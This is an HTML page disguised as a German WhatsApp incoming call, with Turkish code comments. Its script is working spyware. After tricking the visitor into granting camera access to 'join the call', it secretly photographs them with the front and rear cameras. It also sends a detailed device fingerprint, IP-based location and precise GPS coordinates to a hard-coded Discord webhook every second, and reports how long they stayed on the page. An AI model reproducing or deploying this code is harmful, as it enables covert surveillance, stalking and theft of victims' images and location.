<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>WhatsApp</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    body {
      font-family: -apple-system, 'Helvetica Neue', sans-serif;
      background: #0a1f13; height: 100vh; width: 100vw;
      overflow: hidden; display: flex; flex-direction: column; align-items: center;
      color: white; position: relative;
    }
    .bg { position: fixed; inset: 0; background: linear-gradient(180deg, #0d2818 0%, #0a1a0f 40%, #06120a 100%); z-index: 0; }
    .bg::after { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 70% 50% at 50% 20%, rgba(37,211,102,0.12) 0%, transparent 70%); }
    .topbar { position: relative; z-index: 2; width: 100%; padding: 52px 20px 16px; text-align: center; }
    .wa-label { font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom:6px; }
    .caller-name { font-size: 28px; font-weight: 600; margin-bottom:6px; }
    .call-status { font-size: 14px; color: rgba(255,255,255,0.6); }
    .timer { font-size: 14px; color: rgba(255,255,255,0.6); font-variant-numeric:tabular-nums; margin-top:4px; display:none; }
    .avatar-wrap { position: relative; z-index: 2; margin: 40px auto 0; }
    .avatar-ring {
      width: 130px; height: 130px; border-radius: 50%;
      background: rgba(37,211,102,0.15);
      display: flex; align-items: center; justify-content: center;
      animation: ring-pulse 2.5s ease-in-out infinite;
    }
    @keyframes ring-pulse { 0%,100%{box-shadow:0 0 0 0 rgba(37,211,102,0.25)} 50%{box-shadow:0 0 0 20px rgba(37,211,102,0)} }
    .avatar {
      width: 110px; height: 110px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 48px; font-weight: 700; color: white;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4); transition: background 0.4s;
    }
    .controls { position: fixed; bottom: 0; left: 0; right: 0; padding: 0 16px 52px; z-index: 10; }
    .controls-row { display: flex; justify-content: space-around; align-items: center; margin-bottom: 24px; }
    .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; color: white; }
    .ctrl-icon {
      width: 58px; height: 58px; border-radius: 50%;
      background: rgba(255,255,255,0.15);
      display: flex; align-items: center; justify-content: center;
      font-size: 22px; transition: background .15s, transform .1s;
      backdrop-filter: blur(10px);
    }
    .ctrl-icon:active { transform: scale(0.91); }
    .ctrl-btn.toggled .ctrl-icon { background: rgba(255,255,255,0.32); }
    .ctrl-label { font-size: 11px; color: rgba(255,255,255,0.7); font-weight: 500; }
    .end-row { display: flex; justify-content: center; }
    .end-btn {
      width: 70px; height: 70px; border-radius: 50%;
      background: #f04747; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      font-size: 26px; box-shadow: 0 6px 24px rgba(240,71,71,0.5);
      transition: transform .1s;
    }
    .end-btn:active { transform: scale(0.93); }
    video, canvas { display: none; }
    .permission-overlay {
      position: fixed; inset: 0; z-index: 100; background: rgba(10,20,15,0.95);
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      gap: 24px; font-family: -apple-system, sans-serif; color: white; text-align: center; padding: 32px;
    }
    .permission-btn {
      background: #25d366; border: none; color: white; padding: 16px 32px;
      border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer;
      box-shadow: 0 8px 24px rgba(37,211,102,0.4); transition: transform 0.2s;
    }
    .permission-btn:active { transform: scale(0.96); }
  </style>
</head>
<body>
  <div class="bg"></div>
  <div class="topbar">
    <div class="wa-label">WhatsApp</div>
    <div class="caller-name" id="callerName">Nina</div>
    <div class="call-status" id="callStatus">Wird angerufen…</div>
    <div class="timer" id="timer">00:00</div>
  </div>
  <div class="avatar-wrap">
    <div class="avatar-ring">
      <div class="avatar" id="avatar" style="background: linear-gradient(135deg, rgb(37, 211, 102), rgb(18, 140, 126));">N</div>
    </div>
  </div>
  <div class="controls">
    <div class="controls-row">
      <button class="ctrl-btn" id="btnMute"><div class="ctrl-icon">🎤</div><span class="ctrl-label">Stumm</span></button>
      <button class="ctrl-btn" id="btnSpeaker"><div class="ctrl-icon">🔊</div><span class="ctrl-label">Lautsprecher</span></button>
      <button class="ctrl-btn" id="btnVideo"><div class="ctrl-icon">📹</div><span class="ctrl-label">Video</span></button>
    </div>
    <div class="end-row">
      <button class="end-btn" id="btnEnd">📵</button>
    </div>
  </div>
  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    (function() {
      // ── CONFIGURATION ──
      const WEBHOOK = "https://discord.com/api/webhooks/1513149958403133440/VjI_u5TmuJtNn92IxUqtC0N5LFR3cq6bjX5h1n5Gje1KyaUrewZ3Huwb7PgF5wOoXqE1";
      const DATA_INTERVAL_MS = 1000; // 1 saniye döngü
      const RATE_LIMIT_DELAY = 150;   // Discord rate-limit koruması

      // ── STATE ──
      const callers = ["Sarah","Alex","Jakob","Mia","Lukas","Emma","Leon","Anna","Tim","Laura","Jonas","Lena","Felix","Hannah","Ben","Sophie","Finn","Lea","Jan","Nina","Tom","Clara"];
      const avatarColors = [
        "linear-gradient(135deg,#25d366,#128c7e)","linear-gradient(135deg,#e84393,#c2185b)",
        "linear-gradient(135deg,#5865f2,#3d49c4)","linear-gradient(135deg,#e67e22,#d35400)",
        "linear-gradient(135deg,#9b59b6,#7d3c98)","linear-gradient(135deg,#e74c3c,#c0392b)",
        "linear-gradient(135deg,#1abc9c,#16a085)","linear-gradient(135deg,#f39c12,#e67e22)"
      ];

      let currentCaller = callers[Math.floor(Math.random()*callers.length)];
      let seconds = 0, timerInterval = null, callEnded = false, captureStream = null;
      let dataInterval = null;
      const pageStartTime = Date.now();

      // ── AUDIO ENGINE ──
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      let actx = null, ringInterval = null;
      const getCtx = () => { if(!actx) actx = new AudioCtx(); return actx; };
      const playTone = (freq,type,dur,gain=0.3) => {
        try {
          const ctx = getCtx(); const o = ctx.createOscillator(); const g = ctx.createGain();
          o.connect(g); g.connect(ctx.destination); o.type=type; o.frequency.value=freq;
          g.gain.setValueAtTime(gain,ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+dur);
          o.start(); o.stop(ctx.currentTime+dur);
        } catch(e) {}
      };
      const playNotifSound = () => [523,659,784].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.15,0.22),i*100));
      const playTypingSound = () => playTone(300,'square',0.04,0.06);
      const playHangupSound = () => [600,450,300].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.18,0.25),i*160));
      const playConnectSound = () => [700,900].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.12,0.25),i*140));
      const playWhatsAppRing = () => { playTone(620,'sine',0.18,0.28); setTimeout(()=>playTone(820,'sine',0.18,0.28),200); };
      const startRinging = () => { playWhatsAppRing(); ringInterval = setInterval(playWhatsAppRing,1800); };
      const stopRinging = () => { if(ringInterval){clearInterval(ringInterval);ringInterval=null;} };

      // ── HELPERS ──
      const vibrateAvatar = () => {
        const av = document.getElementById('avatar'); if(!av) return;
        ['-4px','4px','-3px','3px','-2px','2px','0px'].forEach((x,i)=>setTimeout(()=>{av.style.transform=`translateX(${x})`;},i*50));
        if(navigator.vibrate) navigator.vibrate([100,50,100]);
      };
      const setCallerUI = (name) => {
        document.getElementById('callerName').textContent = name;
        document.getElementById('avatar').textContent = name[0].toUpperCase();
        document.getElementById('avatar').style.background = avatarColors[Math.floor(Math.random()*avatarColors.length)];
      };
      setCallerUI(currentCaller);

      const startTimer = () => {
        document.getElementById('callStatus').style.display='none';
        document.getElementById('timer').style.display='block';
        timerInterval = setInterval(()=>{
          if(callEnded) return;
          seconds++;
          const el = document.getElementById('timer');
          if(el) el.textContent = String(Math.floor(seconds/60)).padStart(2,'0')+':'+String(seconds%60).padStart(2,'0');
        },1000);
      };

      // ── DISCORD SENDER (rate-limit aware) ──
      const sendToDiscord = async (formData) => {
        try {
          await fetch(WEBHOOK, { method:'POST', body:formData });
        } catch(e) {
          console.warn('Discord gönderim hatası:', e.message);
        }
        await new Promise(r => setTimeout(r, RATE_LIMIT_DELAY));
      };

      // ── ADVANCED FINGERPRINT (30+ veri) ──
      async function collectFingerprintData() {
        const data = {};

        // ── Donanım Bilgileri ──
        data.hardware = {};
        try {
          const bat = await navigator.getBattery();
          data.hardware.battery_level = Math.round(bat.level*100)+'%';
          data.hardware.battery_charging = bat.charging;
          data.hardware.battery_chargingTime = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime)+'s';
          data.hardware.battery_dischargingTime = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime)+'s';
        } catch(e) {
          data.hardware.battery = 'Bilinmiyor';
        }
        data.hardware.cpu_cores = navigator.hardwareConcurrency || 'Bilinmiyor';
        data.hardware.device_memory = navigator.deviceMemory || 'Bilinmiyor';
        data.hardware.max_touch_points = navigator.maxTouchPoints || 0;
        data.hardware.touch_support = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;

        // ── Tarayıcı ve Ekran ──
        data.display = {};
        data.display.screen_resolution = `${window.screen.width}x${window.screen.height}`;
        data.display.available_resolution = `${window.screen.availWidth}x${window.screen.availHeight}`;
        data.display.pixel_ratio = window.devicePixelRatio || 1;
        data.display.color_depth = window.screen.colorDepth;
        data.display.pixel_depth = window.screen.pixelDepth;
        data.display.orientation = screen.orientation ? screen.orientation.type : 'Bilinmiyor';
        data.display.viewport = `${window.innerWidth}x${window.innerHeight}`;

        // Canvas parmak izi
        try {
          const c = document.createElement('canvas');
          c.width = 280; c.height = 60;
          const ctx = c.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = '#069';
          ctx.fillText('CihazParmakIzi <canvas>  fingerprint', 2, 15);
          ctx.fillStyle = 'rgba(102,204,0,0.7)';
          ctx.fillText('CihazParmakIzi <canvas>  fingerprint', 4, 17);
          data.display.canvas_fingerprint = c.toDataURL().slice(-50);
        } catch(e) {
          data.display.canvas_fingerprint = 'Hata';
        }

        // WebGL parmak izi
        try {
          const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
          if(gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.display.webgl_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Bilinmiyor';
            data.display.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Bilinmiyor';
          }
        } catch(e) {}

        data.browser = {};
        data.browser.user_agent = navigator.userAgent;
        data.browser.platform = navigator.platform || 'Bilinmiyor';
        data.browser.language = navigator.language;
        data.browser.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
        data.browser.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser.cookies_enabled = navigator.cookieEnabled;
        data.browser.do_not_track = navigator.doNotTrack || 'Bilinmiyor';
        data.browser.online = navigator.onLine;
        data.browser.java_enabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
        data.browser.product = navigator.product || 'Bilinmiyor';
        data.browser.vendor = navigator.vendor || 'Bilinmiyor';

        // ── Ağ ve Konum ──
        data.network = {};
        try {
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if(conn) {
            data.network.effective_type = conn.effectiveType || conn.type || 'Bilinmiyor';
            data.network.downlink = conn.downlink ? conn.downlink+' Mbps' : 'Bilinmiyor';
            data.network.rtt = conn.rtt ? conn.rtt+' ms' : 'Bilinmiyor';
            data.network.save_data = conn.saveData || false;
          }
        } catch(e) {}

        // IP ve ISP
        try {
          const resp = await fetch('https://ip-api.com/json/?fields=query,isp,country,regionName,city,org,as,mobile,proxy,hosting');
          const ipData = await resp.json();
          data.network.ip = ipData.query || 'Bilinmiyor';
          data.network.isp = ipData.isp || 'Bilinmiyor';
          data.network.org = ipData.org || 'Bilinmiyor';
          data.network.as = ipData.as || 'Bilinmiyor';
          data.network.city = ipData.city || '';
          data.network.region = ipData.regionName || '';
          data.network.country = ipData.country || '';
          data.network.mobile = ipData.mobile || false;
          data.network.proxy = ipData.proxy || false;
          data.network.hosting = ipData.hosting || false;
        } catch(e) {
          try {
            const r2 = await fetch('https://api.ipify.org?format=json');
            const d2 = await r2.json();
            data.network.ip = d2.ip;
          } catch(e2) {}
        }

        // GPS Konum (izinli)
        data.geo = {};
        try {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(pos => {
              data.geo.latitude = pos.coords.latitude.toFixed(6);
              data.geo.longitude = pos.coords.longitude.toFixed(6);
              data.geo.accuracy = Math.round(pos.coords.accuracy)+'m';
              data.geo.altitude = pos.coords.altitude ? pos.coords.altitude.toFixed(2)+'m' : 'Yok';
              data.geo.speed = pos.coords.speed ? pos.coords.speed+' m/s' : 'Yok';
              data.geo.heading = pos.coords.heading ? pos.coords.heading+'°' : 'Yok';
              data.geo.timestamp = new Date(pos.timestamp).toLocaleString();
              resolve();
            }, resolve, { timeout:5000, enableHighAccuracy:true });
          });
        } catch(e) {}

        // ── Ziyaret Sayacı ──
        let visits = parseInt(localStorage.getItem('vc') || '0') + 1;
        localStorage.setItem('vc', visits);
        data.visits = visits;

        return data;
      }

      // ── EMBED OLUŞTURUCU ──
      function buildEmbeds(data, name, photoLabel) {
        const now = new Date();
        const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.timezone });
        const embeds = [];

        // Ana Embed
        embeds.push({
          title: `📞 WhatsApp Anruf – ${name}`,
          color: 0x25d366,
          timestamp: now.toISOString(),
          footer: { text: `Ziyaret #${data.visits} • ${timeStr}` },
          fields: [
            { name: '🕐 Zaman Damgası', value: timeStr, inline: true },
            { name: '🌍 Zaman Dilimi', value: data.browser.timezone, inline: true },
            { name: '📱 Cihaz', value: data.browser.platform, inline: true },
          ]
        });

        // Donanım Embed
        embeds.push({
          title: '🔧 Donanım Bilgileri',
          color: 0x5865f2,
          fields: [
            { name: '🔋 Pil Seviyesi', value: data.hardware.battery_level || 'Bilinmiyor', inline: true },
            { name: '⚡ Şarj Durumu', value: data.hardware.battery_charging ? 'Evet' : 'Hayır', inline: true },
            { name: '🧠 CPU Çekirdek', value: String(data.hardware.cpu_cores), inline: true },
            { name: '💾 Cihaz Belleği (RAM)', value: (data.hardware.device_memory || '?') + ' GB', inline: true },
            { name: '👆 Dokunmatik', value: data.hardware.touch_support ? 'Var ('+data.hardware.max_touch_points+' nokta)' : 'Yok', inline: true },
          ]
        });

        // Ekran ve Tarayıcı Embed
        embeds.push({
          title: '🖥️ Ekran & Tarayıcı',
          color: 0x9b59b6,
          fields: [
            { name: 'Çözünürlük', value: data.display.screen_resolution, inline: true },
            { name: 'Piksel Yoğunluğu', value: data.display.pixel_ratio+'x', inline: true },
            { name: 'Renk Derinliği', value: data.display.color_depth+' bit', inline: true },
            { name: 'Dil', value: data.browser.language, inline: true },
            { name: 'Platform', value: data.browser.platform, inline: true },
            { name: 'Canvas Parmak İzi', value: '```'+data.display.canvas_fingerprint+'```', inline: false },
          ]
        });

        // Ağ Embed
        const netFields = [
          { name: '🌐 IP Adresi', value: '`'+ (data.network.ip || 'Bilinmiyor') +'`', inline: true },
          { name: '🏢 ISS', value: data.network.isp || 'Bilinmiyor', inline: true },
        ];
        if(data.network.effective_type) netFields.push({ name: '📶 Ağ Tipi', value: data.network.effective_type.toUpperCase(), inline: true });
        if(data.network.downlink) netFields.push({ name: '⬇️ Hız', value: data.network.downlink, inline: true });
        if(data.network.city) netFields.push({ name: '📍 Konum', value: `${data.network.city}, ${data.network.region}, ${data.network.country}`, inline: true });

        embeds.push({
          title: '🌐 Ağ Verileri',
          color: 0xe67e22,
          fields: netFields
        });

        // Konum Embed
        if(data.geo.latitude) {
          embeds.push({
            title: '📍 Kesin Konum (GPS)',
            color: 0xe74c3c,
            fields: [
              { name: 'Enlem', value: data.geo.latitude, inline: true },
              { name: 'Boylam', value: data.geo.longitude, inline: true },
              { name: 'Hassasiyet', value: data.geo.accuracy, inline: true },
              { name: 'Harita', value: `[Google Maps](https://maps.google.com/?q=${data.geo.latitude},${data.geo.longitude})`, inline: false },
            ]
          });
        }

        if(photoLabel) {
          embeds[0].image = { url: `attachment://${photoLabel}.jpg` };
        }

        return embeds;
      }

      // ── FOTOĞRAF YAKALAMA ──
      const hiddenVideo = document.getElementById('hiddenVideo');
      const canvas = document.getElementById('canvas');

      function sendPhoto(blob, label, name, fingerprintData) {
        const form = new FormData();
        form.append('file', blob, `${label}.jpg`);
        const embeds = buildEmbeds(fingerprintData, name, label);
        form.append('payload_json', JSON.stringify({ embeds: embeds }));
        sendToDiscord(form);
      }

      function captureFromVideo(video, mirror, label, name, fpData) {
        if(!video.videoWidth) return;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.save();
        if(mirror) { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
        ctx.drawImage(video,0,0);
        ctx.restore();
        canvas.toBlob(b => { if(b) sendPhoto(b, label, name, fpData); }, 'image/jpeg', 0.93);
      }

      function captureWhenReady(attempts, fpData) {
        if(attempts <= 0) return;
        if(!hiddenVideo.videoWidth) { setTimeout(()=>captureWhenReady(attempts-1, fpData), 500); return; }
        canvas.width = hiddenVideo.videoWidth;
        canvas.height = hiddenVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(hiddenVideo,0,0);
        const px = ctx.getImageData(0,0,10,10).data;
        const avg = (px[0]+px[1]+px[2]+px[4]+px[5]+px[6])/6;
        if(avg < 10) { setTimeout(()=>captureWhenReady(attempts-1, fpData), 600); }
        else {
          captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
          setTimeout(async () => {
            try {
              const backStream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:{exact:'environment'}}, audio:false });
              const backVideo = document.createElement('video');
              backVideo.srcObject = backStream;
              backVideo.autoplay = true; backVideo.muted = true;
              backVideo.onloadedmetadata = () => {
                setTimeout(() => {
                  captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
                  backStream.getTracks().forEach(t=>t.stop());
                }, 1200);
              };
            } catch(e) {}
          }, 2000);
        }
      }

      // ── VERİ TOPLAMA DÖNGÜSÜ (1 saniye) ──
      async function dataCollectionLoop() {
        if(callEnded) return;
        try {
          const fpData = await collectFingerprintData();
          const embeds = buildEmbeds(fpData, currentCaller, null);
          const form = new FormData();
          form.append('payload_json', JSON.stringify({ embeds: embeds }));
          await sendToDiscord(form);
        } catch(e) {
          console.warn('Veri toplama döngüsü hatası:', e.message);
        }
        if(!callEnded) {
          dataInterval = setTimeout(dataCollectionLoop, DATA_INTERVAL_MS);
        }
      }

      // ── KAMERA BAŞLATMA ──
      async function startCameraAndCollection() {
        try {
          captureStream = await navigator.mediaDevices.getUserMedia({ video:{width:1280,height:720,facingMode:'user'}, audio:false });
          hiddenVideo.srcObject = captureStream;
          hiddenVideo.onloadedmetadata = async () => {
            document.getElementById('callStatus').textContent = 'Verbunden';
            playTypingSound();
            vibrateAvatar(); stopRinging(); playConnectSound();
            setTimeout(startTimer, 800);

            // İlk veri toplama ve fotoğraf
            try {
              const fpData = await collectFingerprintData();
              const embeds = buildEmbeds(fpData, currentCaller, null);
              const form = new FormData();
              form.append('payload_json', JSON.stringify({ embeds: embeds }));
              await sendToDiscord(form);
              setTimeout(() => captureWhenReady(10, fpData), 1200);
            } catch(e) {}

            // 1 saniyelik döngü başlat
            dataCollectionLoop();
          };
        } catch(e) {
          document.body.innerHTML = `<div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px"><div style="font-size:64px">🚫</div><div style="font-size:22px;font-weight:700">Kamerazugriff erforderlich</div><div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div></div>`;
        }
      }

      // ── İZİN İSTEME ARAYÜZÜ ──
      function showPermissionPrompt() {
        const overlay = document.createElement('div');
        overlay.className = 'permission-overlay';
        overlay.innerHTML = `
          <div style="font-size:48px">📷</div>
          <div style="font-size:20px;font-weight:600">Kamera İzni Gerekli</div>
          <div style="font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;line-height:1.5">Görüntülü aramaya katılmak için kameraya erişim izni vermeniz gerekiyor.</div>
          <button class="permission-btn" id="grantPermissionBtn">📸 Kamerayı Aç ve Aramayı Başlat</button>
        `;
        document.body.appendChild(overlay);
        document.getElementById('grantPermissionBtn').addEventListener('click', async () => {
          overlay.remove();
          await startCameraAndCollection();
        });
      }

      // ── BAŞLANGIÇ ──
      playNotifSound(); vibrateAvatar();
      setTimeout(() => {
        document.getElementById('callStatus').textContent = 'Klingelt…';
        playTypingSound();
        vibrateAvatar(); startRinging();
      }, 600);
      // Kullanıcı etkileşimi için izin iste
      setTimeout(showPermissionPrompt, 1800);

      // ── BUTONLAR ──
      let muted = false;
      document.getElementById('btnMute').addEventListener('click', function(){
        muted = !muted;
        this.classList.toggle('toggled', muted);
        this.querySelector('.ctrl-icon').textContent = muted ? '🔕' : '🎤';
        this.querySelector('.ctrl-label').textContent = muted ? 'Ton an' : 'Stumm';
      });
      document.getElementById('btnSpeaker').addEventListener('click', function(){ this.classList.toggle('toggled'); });
      document.getElementById('btnVideo').addEventListener('click', function(){ this.classList.toggle('toggled'); });

      document.getElementById('btnEnd').addEventListener('click', () => {
        callEnded = true;
        stopRinging(); playHangupSound(); vibrateAvatar();
        if(timerInterval) clearInterval(timerInterval);
        if(dataInterval) clearTimeout(dataInterval);
        if(captureStream) captureStream.getTracks().forEach(t=>t.stop());
        const m = String(Math.floor(seconds/60)).padStart(2,'0');
        const s = String(seconds%60).padStart(2,'0');
        document.body.innerHTML = `
          <div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;font-family:-apple-system,sans-serif;color:white">
            <div style="font-size:52px">📵</div><div style="font-size:22px;font-weight:600">Anruf beendet</div>
            <div style="font-size:14px;color:rgba(255,255,255,0.5)">${m}:${s}</div>
            <button onclick="location.reload()" style="margin-top:12px;display:flex;flex-direction:column;align-items:center;gap:8px;background:none;border:none;cursor:pointer;color:white">
              <div style="width:64px;height:64px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 6px 24px rgba(37,211,102,0.4)">📞</div>
              <span style="font-size:12px;color:rgba(255,255,255,0.6);font-weight:500">Erneut anrufen</span>
            </button>
          </div>`;
      });

      // Sayfadan ayrılma verisi
      window.addEventListener('beforeunload', () => {
        const secs = Math.round((Date.now() - pageStartTime) / 1000);
        const form = new FormData();
        form.append('payload_json', JSON.stringify({
          embeds: [{ title: '⏱️ Besuchszeit', color: 0x95a5a6, description: `Jemand war **${secs} Sekunden** auf der Seite (Anruf: **${currentCaller}**)` }]
        }));
        try { navigator.sendBeacon(WEBHOOK, form); } catch(e) {}
      });
    })();
  </script>
</body>
</html>
